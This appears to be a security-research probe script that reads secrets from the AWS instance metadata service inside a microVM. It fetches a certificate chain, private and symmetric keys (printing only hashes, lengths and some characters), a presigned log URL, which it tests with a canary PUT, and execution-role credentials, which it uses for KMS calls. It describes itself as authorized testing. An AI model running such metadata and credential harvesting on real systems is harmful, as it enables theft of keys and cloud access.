"""
probe_stage6_keys.py — fetch + characterize the Kepler MMDS key set.

Pulls each instance-tag value via IMDSv2 from inside the Harness microVM
and characterizes them for disclosure shape:

  - aws_instance-group-cert-chain-pem        (full PEM; parse subject/SAN/issuer/validity)
  - aws_instance-group-private-key-pem       (LEN + SHA256 only — DO NOT echo raw key)
  - aws_instance-group-symmetric-key         (LEN + entropy check + first/last 4 chars)
  - aws_application-instance-group-key       (group identifier — usually plain text)
  - aws_application-instance-id              (small ID)
  - aws_microvm-id                            (small ID)
  - aws_presigned-log-url                    (parse SigV4 params; HEAD it; tiny canary PUT)
  - aws_presigned-log-kms-key                (KMS key ARN; try kms:Decrypt + kms:DescribeKey)

Read-only except: one tiny canary PUT to the presigned log URL using the
URL's own auth (does NOT use exec-role creds; this is what an instance-
group member would do legitimately).

Authorized research; account owner is the test target.

Output: line-delimited markers, base64-encoded for binary safety.
"""

import os
import sys
import json
import base64
import hashlib
import subprocess
import urllib.parse


def _b64(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.b64encode(data).decode()


def _run(cmd, timeout=15):
    try:
        r = subprocess.run(cmd, capture_output=True, timeout=timeout)
        return r.returncode, r.stdout, r.stderr
    except Exception as e:
        return -1, b'', f'<{type(e).__name__}:{e}>'.encode()


def imds_token():
    rc, tok, _ = _run([
        'curl', '-s', '-m', '5', '-X', 'PUT',
        'http://169.254.169.254/latest/api/token',
        '-H', 'X-aws-ec2-metadata-token-ttl-seconds: 120'])
    if rc != 0:
        return None
    return tok.strip().decode()


def imds_get(token, path):
    rc, body, err = _run([
        'curl', '-s', '-m', '5',
        f'http://169.254.169.254{path}',
        '-H', f'X-aws-ec2-metadata-token: {token}'])
    return rc, body


def shannon_entropy(data: bytes) -> float:
    if not data:
        return 0.0
    import math
    counts = {}
    for b in data:
        counts[b] = counts.get(b, 0) + 1
    total = len(data)
    return -sum((c/total) * math.log2(c/total) for c in counts.values())


def main():
    print('PROBE=stage6-keys v1')

    token = imds_token()
    if not token:
        print('S6_IMDS_TOKEN_FAILED=1')
        print('END')
        return

    # ---- ID-shape tags (safe to echo verbatim) ----
    for name in (
        'aws_microvm-id',
        'aws_application-instance-id',
        'aws_application-instance-group-key',
    ):
        rc, body = imds_get(
            token, f'/latest/meta-data/tags/instance/{name}')
        print(f'S6_TAG[{name}]_RC={rc}')
        if rc == 0:
            text = body.decode('utf-8', errors='replace').strip()
            print(f'S6_TAG[{name}]_VALUE={_b64(text.encode())}')
            print(f'S6_TAG[{name}]_LEN={len(text)}')

    # ---- Cert chain (full PEM; SAFE — public material) ----
    rc, body = imds_get(
        token,
        '/latest/meta-data/tags/instance/aws_instance-group-cert-chain-pem')
    print(f'S6_CERT_CHAIN_RC={rc}')
    if rc == 0 and body:
        print(f'S6_CERT_CHAIN_LEN={len(body)}')
        print(f'S6_CERT_CHAIN_PEM={_b64(body)}')
        # Try parsing with python's ssl/x509 if available
        try:
            from cryptography import x509
            from cryptography.hazmat.backends import default_backend
            # PEM may have multiple certs concatenated
            pem_str = body.decode('utf-8', errors='replace')
            certs = []
            cur = []
            for line in pem_str.splitlines():
                cur.append(line)
                if 'END CERTIFICATE' in line:
                    certs.append('\n'.join(cur))
                    cur = []
            print(f'S6_CERT_COUNT={len(certs)}')
            for i, p in enumerate(certs):
                try:
                    c = x509.load_pem_x509_certificate(
                        p.encode(), default_backend())
                    subj = c.subject.rfc4514_string()
                    issuer = c.issuer.rfc4514_string()
                    nb = c.not_valid_before.isoformat()
                    na = c.not_valid_after.isoformat()
                    sn = format(c.serial_number, 'x')
                    sans = []
                    try:
                        ext = c.extensions.get_extension_for_oid(
                            x509.oid.ExtensionOID.SUBJECT_ALTERNATIVE_NAME)
                        sans = [s.value for s in ext.value]
                    except Exception:
                        pass
                    summary = {
                        'idx': i, 'subject': subj, 'issuer': issuer,
                        'serial': sn, 'not_before': nb, 'not_after': na,
                        'sans': sans,
                    }
                    print(f'S6_CERT[{i}]={_b64(json.dumps(summary).encode())}')
                except Exception as e:
                    print(f'S6_CERT[{i}]_PARSE_ERR={type(e).__name__}:{e}')
        except ImportError:
            print('S6_CERT_PARSE_NO_CRYPTOGRAPHY=1')

    # ---- Private key (LEN + SHA only — DO NOT echo raw) ----
    rc, body = imds_get(
        token,
        '/latest/meta-data/tags/instance/aws_instance-group-private-key-pem')
    print(f'S6_PRIVKEY_RC={rc}')
    if rc == 0 and body:
        print(f'S6_PRIVKEY_LEN={len(body)}')
        print(f'S6_PRIVKEY_SHA256={hashlib.sha256(body).hexdigest()}')
        # Identify key type from PEM header
        head = body[:200].decode('utf-8', errors='replace')
        for marker in ('RSA PRIVATE KEY', 'EC PRIVATE KEY',
                       'PRIVATE KEY', 'OPENSSH PRIVATE KEY',
                       'ENCRYPTED PRIVATE KEY'):
            if marker in head:
                print(f'S6_PRIVKEY_TYPE={marker}')
                break
        # Try parsing modulus / curve via cryptography if available
        try:
            from cryptography.hazmat.primitives import serialization
            from cryptography.hazmat.backends import default_backend
            pk = serialization.load_pem_private_key(
                body, password=None, backend=default_backend())
            pk_kind = type(pk).__name__
            print(f'S6_PRIVKEY_KIND={pk_kind}')
            try:
                key_size = pk.key_size
                print(f'S6_PRIVKEY_SIZE_BITS={key_size}')
            except Exception:
                pass
            # Public-key SHA — useful for cert-vs-key matching
            pub_pem = pk.public_key().public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo)
            print(f'S6_PRIVKEY_PUBLIC_SHA256={hashlib.sha256(pub_pem).hexdigest()}')
        except Exception as e:
            print(f'S6_PRIVKEY_PARSE_ERR={type(e).__name__}:{str(e)[:120]}')

    # ---- Symmetric key (LEN + entropy + bracket chars only) ----
    rc, body = imds_get(
        token,
        '/latest/meta-data/tags/instance/aws_instance-group-symmetric-key')
    print(f'S6_SYMKEY_RC={rc}')
    if rc == 0 and body:
        # Body might be base64-encoded raw bytes, or plain hex, or raw
        text = body.decode('utf-8', errors='replace').strip()
        print(f'S6_SYMKEY_TEXT_LEN={len(text)}')
        print(f'S6_SYMKEY_TEXT_HEAD8={_b64(text[:8].encode())}')
        print(f'S6_SYMKEY_TEXT_TAIL8={_b64(text[-8:].encode())}')
        # If it looks base64, decode and check entropy
        try:
            decoded = base64.b64decode(text, validate=True)
            print(f'S6_SYMKEY_B64DECODED_LEN={len(decoded)}')
            print(f'S6_SYMKEY_B64DECODED_ENTROPY={shannon_entropy(decoded):.3f}')
            print(f'S6_SYMKEY_B64DECODED_SHA256={hashlib.sha256(decoded).hexdigest()}')
        except Exception as e:
            print(f'S6_SYMKEY_NOT_B64={type(e).__name__}')
            # Try hex
            try:
                decoded = bytes.fromhex(text)
                print(f'S6_SYMKEY_HEXDECODED_LEN={len(decoded)}')
                print(f'S6_SYMKEY_HEXDECODED_ENTROPY={shannon_entropy(decoded):.3f}')
            except Exception as e2:
                # raw
                print(f'S6_SYMKEY_RAW_ENTROPY={shannon_entropy(text.encode()):.3f}')

    # ---- Pre-signed log URL ----
    rc, body = imds_get(
        token,
        '/latest/meta-data/tags/instance/aws_presigned-log-url')
    print(f'S6_LOG_URL_RC={rc}')
    if rc == 0 and body:
        url = body.decode('utf-8', errors='replace').strip()
        print(f'S6_LOG_URL_LEN={len(url)}')
        print(f'S6_LOG_URL_VALUE={_b64(url.encode())}')
        # Parse it
        try:
            p = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(p.query)
            url_summary = {
                'scheme': p.scheme, 'host': p.netloc, 'path': p.path,
                'qs_keys': sorted(qs.keys()),
                'amz_credential': qs.get('X-Amz-Credential', [''])[0],
                'amz_signed_headers': qs.get('X-Amz-SignedHeaders', [''])[0],
                'amz_expires': qs.get('X-Amz-Expires', [''])[0],
                'amz_date': qs.get('X-Amz-Date', [''])[0],
                'amz_security_token_present':
                    'X-Amz-Security-Token' in qs,
            }
            print(f'S6_LOG_URL_PARSED={_b64(json.dumps(url_summary).encode())}')
        except Exception as e:
            print(f'S6_LOG_URL_PARSE_ERR={type(e).__name__}:{e}')

        # HEAD it (passive — no body sent)
        rc2, head, err = _run([
            'curl', '-s', '-m', '8', '-I', '-X', 'HEAD', url])
        print(f'S6_LOG_URL_HEAD_RC={rc2}')
        if head:
            print(f'S6_LOG_URL_HEAD={_b64(head[:1500])}')
        if err:
            print(f'S6_LOG_URL_HEAD_STDERR={_b64(err[:400])}')

        # Tiny canary PUT — only 64 bytes; tagged so we can recognize it later
        canary = (
            b'STAGE6_CANARY_DO_NOT_DELETE_'
            + os.urandom(8).hex().encode()
            + b'\n')
        rc3, put, err3 = _run([
            'curl', '-s', '-m', '8', '-X', 'PUT', url,
            '--data-binary', canary.decode(),
            '-w', '\\nHTTP_STATUS:%{http_code}'])
        print(f'S6_LOG_URL_PUT_RC={rc3}')
        if put:
            print(f'S6_LOG_URL_PUT_RESP={_b64(put[:1000])}')

    # ---- KMS key for log encryption ----
    rc, body = imds_get(
        token,
        '/latest/meta-data/tags/instance/aws_presigned-log-kms-key')
    print(f'S6_LOG_KMS_RC={rc}')
    if rc == 0 and body:
        kms_id = body.decode('utf-8', errors='replace').strip()
        print(f'S6_LOG_KMS_ID={_b64(kms_id.encode())}')
        # Try DescribeKey via boto3 with exec-role creds
        try:
            # Need IMDS exec-role creds first
            rc, creds_body = imds_get(
                token,
                '/latest/meta-data/iam/security-credentials/execution_role')
            if rc == 0 and creds_body:
                creds = json.loads(creds_body.decode())
                os.environ['AWS_ACCESS_KEY_ID'] = creds['AccessKeyId']
                os.environ['AWS_SECRET_ACCESS_KEY'] = creds['SecretAccessKey']
                os.environ['AWS_SESSION_TOKEN'] = creds['Token']
                import boto3
                from botocore.exceptions import ClientError
                kms = boto3.client('kms', region_name='us-east-1')
                try:
                    info = kms.describe_key(KeyId=kms_id)
                    info.pop('ResponseMetadata', None)
                    print(f'S6_KMS_DESCRIBE_OK={_b64(json.dumps(info, default=str).encode())}')
                except ClientError as e:
                    print(f'S6_KMS_DESCRIBE_ERR={e.response["Error"]["Code"]}:'
                          f'{e.response["Error"].get("Message","")[:200]}')
                # GetKeyPolicy attempt — if customer-shared key, we'd see
                # the policy
                try:
                    pol = kms.get_key_policy(KeyId=kms_id, PolicyName='default')
                    print(f'S6_KMS_POLICY={_b64(pol["Policy"][:2000].encode())}')
                except ClientError as e:
                    print(f'S6_KMS_POLICY_ERR={e.response["Error"]["Code"]}:'
                          f'{e.response["Error"].get("Message","")[:200]}')
        except Exception as e:
            print(f'S6_KMS_BOTO_ERR={type(e).__name__}:{str(e)[:200]}')

    print('END')


if __name__ == '__main__':
    main()
